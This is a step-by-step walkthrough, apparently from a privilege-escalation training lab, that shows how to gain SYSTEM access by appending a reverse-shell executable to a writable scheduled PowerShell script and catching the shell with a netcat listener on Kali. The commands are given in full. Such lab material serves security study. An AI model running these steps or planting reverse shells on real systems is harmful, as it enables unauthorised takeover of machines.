
---

### 🔍 **Step 1: View the PowerShell Script (`CleanUp.ps1`)**

```cmd
type C:\DevTools\CleanUp.ps1
```

- **What it does:** Displays the content of the `CleanUp.ps1` script.
    
- **Why:** This will allow you to review what the script is doing. In this case, it runs every minute with SYSTEM privileges.
    

---

### 🔑 **Step 2: Check Permissions on `CleanUp.ps1`**

Use **`accesschk.exe`** to see if the current user can modify the `CleanUp.ps1` script:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

- **What it does:** Checks if the **user** has **write permissions** (`w`) to the file.
    
- **What to look for:** If the output shows that you **can write** to this file, you're in luck! You can modify the script to execute your payload.
    

---

### 🚀 **Step 3: Append Reverse Shell to Script**

Now, append the path to your **reverse shell** (`reverse.exe`) to the script:

```cmd
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

- **What it does:** Adds the line `C:\PrivEsc\reverse.exe` to the **end** of `CleanUp.ps1`, so it will run **every time** the script executes.
    
- **Why:** The script is already running as SYSTEM every minute, and now it will trigger a reverse shell when it runs.
    

---

### 🎧 **Step 4: Start a Listener on Kali**

Start a **Netcat listener** on Kali to receive the reverse shell:

```bash
nc -lvnp 4444
```

- **Why:** This prepares Kali to listen for the incoming reverse shell connection on port `4444`. Make sure the reverse shell (`reverse.exe`) is configured to connect back to your Kali IP.
    

---

### ⏳ **Step 5: Wait for the Scheduled Task to Trigger**

Since the script runs every minute, you just need to **wait** for the next execution. When the script runs, it will trigger your reverse shell, giving you **SYSTEM**-level access.

---
